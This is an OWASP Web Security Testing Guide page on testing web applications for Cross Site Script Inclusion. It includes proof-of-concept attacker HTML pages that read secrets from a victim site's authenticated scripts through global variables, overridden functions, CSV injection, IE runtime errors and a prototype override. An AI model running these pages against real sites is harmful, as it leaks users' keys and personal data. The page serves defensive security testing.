# WSTG - Latest
[Home](https://owasp.org/www-project-web-security-testing-guide/) > [Latest](https://owasp.org/www-project-web-security-testing-guide/latest/) > [4-Web Application Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/) > [11-Client-side Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/)
# Testing for Cross Site Script Inclusion
ID  
---  
WSTG-CLNT-13  
## Summary
Cross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries. Sensitive data could include authentication-related data (login states, cookies, auth tokens, session IDs, etc.) or user’s personal or sensitive personal data (email addresses, phone numbers, credit card details, social security numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but has a different purpose. Where CSRF uses the authenticated user context to execute certain state-changing actions inside a victim’s page (e.g. transfer money to the attacker’s account, modify privileges, reset password, etc.), XSSI instead uses JavaScript on the client-side to leak sensitive data from authenticated sessions.
By default, websites are only allowed to access data if they are from the same origin. This is a key application security principle and governed by the same-origin policy (defined by [RFC 6454](https://tools.ietf.org/html/rfc6454)). An origin is defined as the combination of URI scheme (HTTP or HTTPS), host name, and port number. However, this policy is not applicable for HTML `<script>` tag inclusions. This exception is necessary, as without it websites would not be able to consume third party services, perform traffic analysis, or use advertisement platforms, etc.
When the browser opens a website with `<script>` tags, the resources are fetched from the cross-origin domain. The resources then run in the same context as the including site or browser, which presents the opportunity to leak sensitive data. In most cases, this is achieved using JavaScript, however, the script source doesn’t have to be a JavaScript file with type `text/javascript` or `.js` extension.
Older browser’s vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those vulnerabilities have now been patched by vendors and are considered less relevant. By setting the charset attribute of the `<script>` tag, an attacker or tester can enforce UTF-16 encoding, allowing data leakage for other data formats (e.g. JSON) in some cases. For more on these attacks, see [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf).
## Test Objectives
  * Locate sensitive data across the system.
  * Assess the leakage of sensitive data through various techniques.


## How to Test
### Collect Data Using Authenticated and Unauthenticated User Sessions
Identify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using [JSONP](https://en.wikipedia.org/wiki/JSONP). To find dynamically generated JavaScript responses, generate authenticated and unauthenticated requests, then compare them. If they’re different, it means the response is dynamic; otherwise it’s static. To simplify this task, a tool such as [Veit Hailperin’s Burp proxy plugin](https://github.com/luh2/DetectDynamicJS) can be used. Make sure to check other file types in addition to JavaScript; XSSI is not limited to JavaScript files alone.
### Determine Whether the Sensitive Data Can Be Leaked Using JavaScript
Testers should analyze code for the following vehicles for data leakage via XSSI vulnerabilities:
  1. Global variables
  2. Global function parameters
  3. CSV (Comma Separated Values) with quotations theft
  4. JavaScript runtime errors
  5. Prototype chaining using `this`


### 1. Sensitive Data Leakage via Global Variables
An API key is stored in a JavaScript file with the URI `https://victim.com/internal/api.js` on the victim’s website, `victim.com`, which is only accessible to authenticated users. An attacker configures a website, `attackingwebsite.com`, and uses the `<script>` tag to refer to the JavaScript file.
Here are the contents of `https://victim.com/internal/api.js`:
```
(function() {
  window.secret = "supersecretUserAPIkey";
})();

```

The attack site, `attackingwebsite.com`, has an `index.html` with the following code:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>

```

In this example, a victim is authenticated with `victim.com`. An attacker lures the victim to `attackingwebsite.com` via social engineering, phishing emails, etc. The victim’s browser then fetches `api.js`, resulting in the sensitive data being leaked via the global JavaScript variable and displayed using `innerHTML`.
### 2. Sensitive Data Leakage via Global Function Parameters
This example is similar to the previous one, except in this case `attackingwebsite.com` uses a global JavaScript function to extract the sensitive data by overwriting the victim’s global JavaScript function.
Here are the contents of `https://victim.com/internal/api.js`:
```
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();

```

The attack site, `attackingwebsite.com`, has an `index.html` with the following code:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>

```

There are other XSSI vulnerabilities that can result in sensitive data leakage either via JavaScript prototype chains or global function calls. For more on these attacks, see [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).
### 3. Sensitive Data Leakage via CSV with Quotations Theft
To leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example code is an excerpt from Takeshi Terada’s [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf) whitepaper.
```
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"

```

In this example, using the `___` columns as injection points and inserting JavaScript strings in their place has the following result.
```
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"

```

[Jeremiah Grossman wrote about a similar vulnerability in Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) in 2006 that allowed the extraction of user contacts in JSON. In this case, the data was received from Gmail and parsed by the browser JavaScript engine using an unreferenced Array constructor to leak the data. An attacker could access this Array with the sensitive data by defining and overwriting the internal Array constructor like this:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // steal data
      }
    </script>
    <script src="https://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>

```

### 4. Sensitive Data Leakage via JavaScript Runtime Errors
Browsers normally present standardized [JavaScript error messages](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors). However, in the case of IE9/10, runtime error messages provided additional details that could be used to leak data. For example, a website `victim.com` serves the following content at the URI `https://victim.com/service/csvendpoint` for authenticated users:
```
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: 13

1,abc,def,ghi

```

This vulnerability could be exploited with the following:
```
<!--error handler -->
<script>window.onerror = function(err) {alert(err)}</script>
<!--load target CSV -->
<script src="https://victim.com/service/csvendpoint"></script>

```

When the browser tries to render the CSV content as JavaScript, it fails and leaks the sensitive data:
![JavaScript runtime error message ](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/images/XSSI1.jpeg)  
_Figure 4.11.13-1: JavaScript runtime error message_
### 5. Sensitive Data Leakage via Prototype Chaining Using `this`
In JavaScript, the `this` keyword is dynamically scoped. This means if a function is called upon an object, `this` will point to this object even though the called function might not belong to the object itself. This behavior can be used to leak data. In the following example from [Sebastian Leike’s demonstration page](http://sebastian-lekies.de/leak/), the sensitive data is stored in an Array. An attacker can override `Array.prototype.forEach` with an attacker-controlled function. If some code calls the `forEach` function on an array instance that contains sensitive values, the attacker-controlled function will be invoked with `this` pointing to the object that contains the sensitive data.
Here is an excerpt of a JavaScript file containing sensitive data, `javascript.js`:
```
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // do something here
  });  
})();
...

```

The sensitive data can be leaked with the following JavaScript code:
```
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Your secret values are: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="https://victim.com/..../javascript.js"></script>
...

```

* * *
[Edit on GitHub](https://github.com/OWASP/www-project-web-security-testing-guide/blob/master/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md)
**The OWASP ® Foundation** works to improve the security of software through its community-led open source software projects, hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences. 
## Spotlight: Cobalt
[![image](https://owasp.org/assets/images/corp-member-logo/Cobalt.png)](https://www.cobalt.io/)
Cobalt combines talent and technology to provide end-to-end offensive security solutions that enable organizations to remediate risk across a dynamically changing attack surface. The innovators of Pentest as a Service, Cobalt empowers businesses to optimize their existing resources, access an on-demand community of trusted security experts, expedite remediation cycles, and share real-time updates and progress with internal teams to mitigate future risk.
## Corporate Supporters
[![image](https://owasp.org/assets/images/corp-member-logo/AppDome.png)](https://www.appdome.com/)[![image](https://owasp.org/assets/images/corp-member-logo/tenable_logo.png)](https://www.tenable.com)[![image](https://owasp.org/assets/images/corp-member-logo/Checkmarxn-NewLogo2024.jpg)](http://checkmarx.com)[![image](https://owasp.org/assets/images/corp-member-logo/InfoSecMap-logo-small.png)](https://infosecmap.com)[![image](https://owasp.org/assets/images/corp-member-logo/UnboundSecurity.png)](https://unboundsecurity.ai/)[![image](https://owasp.org/assets/images/corp-member-logo/Automattic.png)](https://automattic.com/)[![image](https://owasp.org/assets/images/corp-member-logo/Root.png)](https://www.root.io/)[![image](https://owasp.org/assets/images/corp-member-logo/Adobe.png)](http://trust.adobe.com)[![image](https://owasp.org/assets/images/corp-member-logo/Scitum.png)](https://www.scitum.com.mx/)
[Become a corporate supporter](https://owasp.org/supporters)
[](https://github.com/OWASP/) [](https://owasp.org/slack/invite) [](https://www.facebook.com/OWASPFoundation) [](https://infosec.exchange/@owasp) [](https://twitter.com/owasp) [](https://www.linkedin.com/company/owasp/) [](https://www.youtube.com/user/OWASPGLOBAL)
  * [HOME](https://owasp.org/)
  * [PROJECTS](https://owasp.org/projects/)
  * [CHAPTERS](https://owasp.org/chapters/)
  * [EVENTS](https://owasp.org/events/)
  * [ABOUT](https://owasp.org/about/)
  * [PRIVACY](https://owasp.org/www-policy/operational/privacy)
  * [SITEMAP](https://owasp.org/sitemap/)
  * [CONTACT](https://owasp.org/contact/)


OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](https://owasp.org/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc. 
